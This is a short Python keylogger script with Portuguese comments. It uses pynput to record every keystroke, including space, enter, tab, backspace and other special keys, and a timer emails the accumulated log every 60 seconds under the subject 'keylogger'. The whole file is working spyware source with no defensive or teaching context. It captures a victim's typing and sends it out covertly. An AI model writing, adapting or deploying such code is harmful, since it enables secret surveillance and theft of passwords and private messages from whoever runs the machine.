from pynput import keyboard
from threading import Timer
from utils import send_email
from config import IGNORAR

log = ""

def enviar_email():
    global log
    if log:
        send_email("keylogger", log)
    log = ""

    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        if key.char:
            log+=key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log+=" "
        elif key == keyboard.Key.enter:
            log+="\n"
        elif key == keyboard.Key.tab:
            log+="\t"
        elif key == keyboard.Key.backspace:
            log+=" << "
        elif key == keyboard.Key.esc:
            log+=" [ESC] "
        elif key in IGNORAR:
            pass
        else:
            log += f" [{key.name}] "  # Fallback para outras teclas

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()